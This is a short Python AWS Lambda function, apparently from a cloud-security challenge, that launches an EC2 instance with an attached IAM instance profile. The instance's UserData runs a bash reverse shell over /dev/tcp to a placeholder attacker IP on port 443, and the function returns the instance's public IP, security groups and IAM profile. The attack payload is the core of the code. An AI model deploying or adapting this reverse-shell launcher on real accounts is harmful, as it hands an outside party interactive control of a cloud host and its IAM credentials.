import boto3
import time

def lambda_handler(event, context):
    
    # Work in Progress: Requires help from Agents! 
    
    ec2 = boto3.resource('ec2')

    instances = ec2.create_instances(
       ImageId="ami-0b89f7b3f054b957e", # Amazon Linux
       MinCount=1,
       MaxCount=1,
       InstanceType="t2.micro",
       SubnetId="subnet-0aa6ecdf900166741",
       TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [
                    {
                        'Key': 'agent',
                        'Value': 'user-860d7932eb424a9995d5ce743f0540cf'
                    },
                ]
            },
        ],
        UserData="""
        #!/bin/sh
        bash -i >& /dev/tcp/<your_reverse_shell_ip>/443 0>&1
        """,
        IamInstanceProfile={
            'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
        }
    )

    instance = instances[0]
    return {
        'status': 200,
        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3',
        'public_dns': instance.public_dns_name,
        'public_ip': instance.public_ip_address,
        'security_groups': instance.security_groups,
        'subnet_id': instance.subnet_id,
        'tags': instance.tags,
        'iam_instance_profile': instance.iam_instance_profile
    }
